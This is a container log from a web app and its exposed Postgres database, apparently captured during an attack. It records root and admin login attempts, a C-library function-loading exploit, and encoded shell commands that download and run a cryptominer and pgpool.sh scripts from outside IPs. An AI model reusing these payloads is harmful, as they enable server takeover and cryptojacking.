-[33mweb_1       |[0m [2017-04-06 08:04:45 +0000] [56] [INFO] Booting worker with pid: 56
-[33mweb_1       |[0m [2017-04-06 08:04:45 +0000] [58] [INFO] Booting worker with pid: 58
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-06 10:09:51 +0000] [56] [INFO] Worker reloading: /code/toolapp/settings.py modified
-[33mweb_1       |[0m [2017-04-06 10:09:51 +0000] [56] [INFO] Worker exiting (pid: 56)
-[33mweb_1       |[0m [2017-04-06 10:09:52 +0000] [58] [INFO] Worker reloading: /code/toolapp/settings.py modified
-[33mweb_1       |[0m [2017-04-06 10:09:52 +0000] [58] [INFO] Worker exiting (pid: 58)
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m FATAL:  database "template0" is not currently accepting connections
-[32mpostgres_1  |[0m FATAL:  database "-h" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m LOG:  incomplete startup packet
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  database "template0" is not currently accepting connections
-[32mpostgres_1  |[0m FATAL:  database "-h" does not exist
-[32mpostgres_1  |[0m ERROR:  table "gavudb" does not exist
-[32mpostgres_1  |[0m STATEMENT:  DROP TABLE gavudb
-[32mpostgres_1  |[0m ERROR:  large object 5632 does not exist
-[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(5632)
-[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libsenqj.so": version mismatch
-[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
-[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION sylib(text) RETURNS int4 AS '/tmp/libsenqj.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
-[32mpostgres_1  |[0m ERROR:  function sylib(text) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  SELECT sylib((CHR(112)||CHR(115)||CHR(32)||CHR(45)||CHR(101)||CHR(102)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(45)||CHR(118)||CHR(32)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(124)||CHR(99)||CHR(117)||CHR(116)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(57)||CHR(45)||CHR(49)||CHR(53)||CHR(124)||CHR(120)||CHR(97)||CHR(114)||CHR(103)||CHR(115)||CHR(32)||CHR(107)||CHR(105)||CHR(108)||CHR(108)||CHR(32)||CHR(45)||CHR(57)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(49)||CHR(57)||CHR(50)||CHR(46)||CHR(53)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(106)||CHR(102)||CHR(112)||CHR(112)||CHR(117)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(106)||CHR(102)||CHR(112)||CHR(112)||CHR(117)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(106)||CHR(102)||CHR(112)||CHR(112)||CHR(117)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||CHR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(38)))
-[32mpostgres_1  |[0m ERROR:  table "qrljkc" does not exist
-[32mpostgres_1  |[0m STATEMENT:  DROP TABLE qrljkc
-[32mpostgres_1  |[0m ERROR:  large object 9015 does not exist
-[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(9015)
-[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libscxjp.so": version mismatch
-[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
-[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION sylib(text) RETURNS int4 AS '/tmp/libscxjp.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
-[32mpostgres_1  |[0m ERROR:  function sylib(text) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  SELECT sylib((CHR(112)||CHR(115)||CHR(32)||CHR(45)||CHR(101)||CHR(102)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(45)||CHR(118)||CHR(32)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(124)||CHR(99)||CHR(117)||CHR(116)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(57)||CHR(45)||CHR(49)||CHR(53)||CHR(124)||CHR(120)||CHR(97)||CHR(114)||CHR(103)||CHR(115)||CHR(32)||CHR(107)||CHR(105)||CHR(108)||CHR(108)||CHR(32)||CHR(45)||CHR(57)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(49)||CHR(57)||CHR(50)||CHR(46)||CHR(53)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(117)||CHR(115)||CHR(114)||CHR(47)||CHR(99)||CHR(114)||CHR(113)||CHR(119)||CHR(117)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(117)||CHR(115)||CHR(114)||CHR(47)||CHR(99)||CHR(114)||CHR(113)||CHR(119)||CHR(117)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(117)||CHR(115)||CHR(114)||CHR(47)||CHR(99)||CHR(114)||CHR(113)||CHR(119)||CHR(117)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||CHR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(38)))
-[32mpostgres_1  |[0m ERROR:  table "mxwnjn" does not exist
-[32mpostgres_1  |[0m STATEMENT:  DROP TABLE mxwnjn
-[32mpostgres_1  |[0m ERROR:  large object 9883 does not exist
-[32mpostgres_1  |[0m STATEMENT:  SELECT lo_unlink(9883)
-[32mpostgres_1  |[0m ERROR:  incompatible library "/tmp/libsrzoq.so": version mismatch
-[32mpostgres_1  |[0m DETAIL:  Server is version 9.6, library is version 9.4.
-[32mpostgres_1  |[0m STATEMENT:  CREATE OR REPLACE FUNCTION sylib(text) RETURNS int4 AS '/tmp/libsrzoq.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE
-[32mpostgres_1  |[0m ERROR:  function sylib(text) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  SELECT sylib((CHR(112)||CHR(115)||CHR(32)||CHR(45)||CHR(101)||CHR(102)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(124)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(32)||CHR(45)||CHR(118)||CHR(32)||CHR(103)||CHR(114)||CHR(101)||CHR(112)||CHR(124)||CHR(99)||CHR(117)||CHR(116)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(57)||CHR(45)||CHR(49)||CHR(53)||CHR(124)||CHR(120)||CHR(97)||CHR(114)||CHR(103)||CHR(115)||CHR(32)||CHR(107)||CHR(105)||CHR(108)||CHR(108)||CHR(32)||CHR(45)||CHR(57)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(119)||CHR(103)||CHR(101)||CHR(116)||CHR(32)||CHR(104)||CHR(116)||CHR(116)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(53)||CHR(46)||CHR(55)||CHR(54)||CHR(46)||CHR(49)||CHR(57)||CHR(50)||CHR(46)||CHR(53)||CHR(47)||CHR(116)||CHR(48)||CHR(109)||CHR(99)||CHR(97)||CHR(116)||CHR(32)||CHR(45)||CHR(113)||CHR(32)||CHR(45)||CHR(79)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(117)||CHR(102)||CHR(118)||CHR(106)||CHR(113)||CHR(100)||CHR(111)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(99)||CHR(104)||CHR(109)||CHR(111)||CHR(100)||CHR(32)||CHR(43)||CHR(120)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(117)||CHR(102)||CHR(118)||CHR(106)||CHR(113)||CHR(100)||CHR(111)||CHR(32)||CHR(38)||CHR(38)||CHR(32)||CHR(110)||CHR(111)||CHR(104)||CHR(117)||CHR(112)||CHR(32)||CHR(47)||CHR(116)||CHR(109)||CHR(112)||CHR(47)||CHR(117)||CHR(102)||CHR(118)||CHR(106)||CHR(113)||CHR(100)||CHR(111)||CHR(32)||CHR(45)||CHR(99)||CHR(32)||CHR(120)||CHR(32)||CHR(45)||CHR(77)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(97)||CHR(116)||CHR(117)||CHR(109)||CHR(43)||CHR(116)||CHR(99)||CHR(112)||CHR(58)||CHR(47)||CHR(47)||CHR(52)||CHR(57)||CHR(114)||CHR(82)||CHR(56)||CHR(69)||CHR(57)||CHR(65)||CHR(51)||CHR(67)||CHR(90)||CHR(78)||CHR(50)||CHR(106)||CHR(100)||CHR(78)||CHR(112)||CHR(74)||CHR(75)||CHR(52)||CHR(78)||CHR(77)||CHR(76)||CHR(89)||CHR(75)||CHR(67)||CHR(77)||CHR(57)||CHR(84)||CHR(76)||CHR(98)||CHR(83)||CHR(69)||CHR(65)||CHR(66)||CHR(52)||CHR(109)||CHR(57)||CHR(70)||CHR(120)||CHR(76)||CHR(103)||CHR(88)||CHR(90)||CHR(67)||CHR(52)||CHR(112)||CHR(118)||CHR(122)||CHR(54)||CHR(109)||CHR(87)||CHR(102)||CHR(120)||CHR(75)||CHR(54)||CHR(78)||CHR(82)||CHR(72)||CHR(118)||CHR(57)||CHR(89)||CHR(51)||CHR(67)||CHR(51)||CHR(88)||CHR(97)||CHR(57)||CHR(110)||CHR(113)||CHR(82)||CHR(76)||CHR(106)||CHR(85)||CHR(85)||CHR(72)||CHR(102)||CHR(85)||CHR(55)||CHR(119)||CHR(101)||CHR(114)||CHR(114)||CHR(83)||CHR(110)||CHR(101)||CHR(49)||CHR(68)||CHR(80)||CHR(51)||CHR(85)||CHR(102)||CHR(103)||CHR(119)||CHR(50)||CHR(58)||CHR(120)||CHR(64)||CHR(120)||CHR(109)||CHR(114)||CHR(46)||CHR(99)||CHR(114)||CHR(121)||CHR(112)||CHR(116)||CHR(111)||CHR(45)||CHR(112)||CHR(111)||CHR(111)||CHR(108)||CHR(46)||CHR(102)||CHR(114)||CHR(58)||CHR(51)||CHR(51)||CHR(51)||CHR(51)||CHR(47)||CHR(120)||CHR(109)||CHR(114)||CHR(32)||CHR(38)))
-[32mpostgres_1  |[0m LOG:  unexpected EOF on client connection with an open transaction
-[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://23.239.23.122/pgpool.sh -O /tmp/pgpool.sh;curl http://23.239.23.122/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m LOG:  incomplete startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 65363.19778: server supports 1.0 to 3.0
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m FATAL:  unsupported frontend protocol 27265.28208: server supports 1.0 to 3.0
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m LOG:  invalid length of startup packet
-[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://45.79.102.120/pgpool.sh -O /tmp/pgpool.sh;curl http://45.79.102.120/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
-[32mpostgres_1  |[0m sh: 1: wget: not found
-[32mpostgres_1  |[0m LOG:  server process (PID 26121) exited with exit code 127
-[32mpostgres_1  |[0m LOG:  terminating any other active server processes
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
-[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-20 09:28:52 UTC
-[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
-[32mpostgres_1  |[0m LOG:  invalid record length at 0/173D5C8: wanted 24, got 0
-[32mpostgres_1  |[0m LOG:  redo is not required
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m LOG:  could not receive data from client: Connection reset by peer
-[32mpostgres_1  |[0m LOG:  incomplete startup packet
-[32mpostgres_1  |[0m LOG:  unexpected EOF on client connection with an open transaction
-[32mpostgres_1  |[0m sh: 1: wget: not found
-[32mpostgres_1  |[0m LOG:  server process (PID 27218) exited with exit code 127
-[32mpostgres_1  |[0m LOG:  terminating any other active server processes
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[33mweb_1       |[0m [2017-04-06 08:09:52 +0000] [104] [INFO] Booting worker with pid: 104
-[33mweb_1       |[0m [2017-04-06 08:09:52 +0000] [106] [INFO] Booting worker with pid: 106
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [104] [INFO] Worker reloading: /code/cohapp/models.py modified
-[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [106] [INFO] Worker reloading: /code/cohapp/models.py modified
-[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [104] [INFO] Worker reloading: /code/cohapp/serializers.py modified
-[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [104] [INFO] Worker reloading: /code/cohapp/coherenceanalyzer/coherenceanalyzer.py modified
-[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [106] [INFO] Worker reloading: /code/cohapp/serializers.py modified
-[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [106] [INFO] Worker reloading: /code/cohapp/coherenceanalyzer/coherenceanalyzer.py modified
-[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [106] [INFO] Worker exiting (pid: 106)
-[33mweb_1       |[0m [2017-04-07 09:08:44 +0000] [104] [INFO] Worker exiting (pid: 104)
-[33mweb_1       |[0m [2017-04-07 09:08:46 +0000] [104] [INFO] Worker reloading: /code/cohapp/models.py modified
-[33mweb_1       |[0m [2017-04-07 07:08:48 +0000] [216] [INFO] Booting worker with pid: 216
-[33mweb_1       |[0m [2017-04-07 07:08:48 +0000] [217] [INFO] Booting worker with pid: 217
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
-[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-21 18:46:56 UTC
-[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
-[32mpostgres_1  |[0m LOG:  invalid record length at 0/1742280: wanted 24, got 0
-[32mpostgres_1  |[0m LOG:  redo is not required
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m sh: 1: wget: not found
-[32mpostgres_1  |[0m LOG:  server process (PID 27793) exited with exit code 127
-[32mpostgres_1  |[0m LOG:  terminating any other active server processes
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m WARNING:  terminating connection because of crash of another server process
-[32mpostgres_1  |[0m DETAIL:  The postmaster has commanded this server process to roll back the current transaction and exit, because another server process exited abnormally and possibly corrupted shared memory.
-[32mpostgres_1  |[0m HINT:  In a moment you should be able to reconnect to the database and repeat your command.
-[32mpostgres_1  |[0m LOG:  all server processes terminated; reinitializing
-[32mpostgres_1  |[0m LOG:  database system was interrupted; last known up at 2017-04-22 08:52:52 UTC
-[32mpostgres_1  |[0m LOG:  database system was not properly shut down; automatic recovery in progress
-[32mpostgres_1  |[0m LOG:  redo starts at 0/174E168
-[32mpostgres_1  |[0m LOG:  invalid magic number 0000 in log segment 000000010000000000000001, offset 7708672
-[32mpostgres_1  |[0m LOG:  redo done at 0/1758380
-[32mpostgres_1  |[0m LOG:  MultiXact member wraparound protections are now enabled
-[32mpostgres_1  |[0m LOG:  database system is ready to accept connections
-[32mpostgres_1  |[0m LOG:  autovacuum launcher started
-[32mpostgres_1  |[0m ERROR:  function sys_sun(unknown) does not exist at character 8
-[32mpostgres_1  |[0m HINT:  No function matches the given name and argument types. You might need to add explicit type casts.
-[32mpostgres_1  |[0m STATEMENT:  select sys_sun('rm -rf /tmp/*.sh;wget -P /tmp/ http://45.79.102.120/pgpool.sh -O /tmp/pgpool.sh;curl http://45.79.102.120/pgpool.sh -o /tmp/pgpool.sh;chmod +x /tmp/pgpool.sh;/tmp/pgpool.sh > /dev/null &');
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "root" does not exist
-[32mpostgres_1  |[0m FATAL:  role "admin" does not exist
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
-[33mweb_1       |[0m reading parameter file...finished
-[33mweb_1       |[0m 01
